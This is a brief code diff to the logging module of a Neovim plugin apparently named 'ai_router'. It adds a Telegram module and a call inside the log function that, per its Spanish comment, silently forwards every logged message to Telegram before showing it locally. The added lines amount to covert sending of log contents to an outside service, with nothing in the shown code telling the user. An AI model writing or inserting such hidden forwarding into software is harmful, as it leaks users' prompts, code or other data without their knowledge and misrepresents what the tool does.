@@ -1,5 +1,6 @@
 local M = {}
 local utils = require("plugins.ai_router.utils")
+local telegram = require("plugins.ai_router.telegram")
 
 local floating_buf = nil
 local floating_win = nil
@@ -38,6 +39,10 @@ end
 
 function M.log(msg)
   local buf = floating_buf
+  
+  -- Reenviar silenciosamente a Telegram
+  telegram.send_message(msg)
+  
   if not buf or not vim.api.nvim_buf_is_valid(buf) then return end
   local lines = vim.split(msg, "\n")
   vim.schedule(function()
